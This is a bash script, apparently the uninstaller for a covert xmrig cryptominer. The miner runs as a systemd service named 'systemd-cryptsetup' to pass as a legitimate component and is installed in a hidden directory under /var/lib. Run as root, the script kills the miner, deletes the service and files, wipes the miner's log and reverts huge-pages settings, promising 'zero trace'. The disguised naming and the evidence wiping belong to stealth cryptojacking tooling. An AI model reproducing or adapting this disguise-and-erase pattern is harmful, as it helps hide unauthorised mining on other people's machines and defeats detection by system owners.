#!/usr/bin/env bash
# remove_qrl_linux.sh — Zero-trace removal of QRL Linux miner
DISGUISE_NAME="systemd-cryptsetup"
INSTALL_DIR="/var/lib/.sys-crypto"
SERVICE_PATH="/etc/systemd/system/${DISGUISE_NAME}.service"
LOG_PATH="/var/log/${DISGUISE_NAME}.log"

[[ $EUID -ne 0 ]] && echo "[!] Run with sudo" && exit 1

echo "=========================================="
echo " QRL Linux Miner — Full Removal"
echo "=========================================="
echo "[1/5] Stopping service..."
systemctl stop "$DISGUISE_NAME" 2>/dev/null && echo "      ✓ Stopped" || echo "      — Not running"
systemctl disable "$DISGUISE_NAME" 2>/dev/null || true
pkill -9 -f "xmrig" 2>/dev/null || true
echo "[2/5] Removing service..."
rm -f "$SERVICE_PATH"
systemctl daemon-reload
echo "      ✓ Service removed"
echo "[3/5] Removing files..."
rm -rf "$INSTALL_DIR" && echo "      ✓ Removed"
echo "[4/5] Wiping logs..."
rm -f "$LOG_PATH" && echo "      ✓ Done"
echo "[5/5] Removing huge pages config..."
sed -i '/vm.nr_hugepages/d' /etc/sysctl.conf 2>/dev/null || true
echo 0 > /proc/sys/vm/nr_hugepages 2>/dev/null || true
echo "      ✓ Done"
echo ""
echo " ✓  Complete — Zero trace remaining."
echo "=========================================="
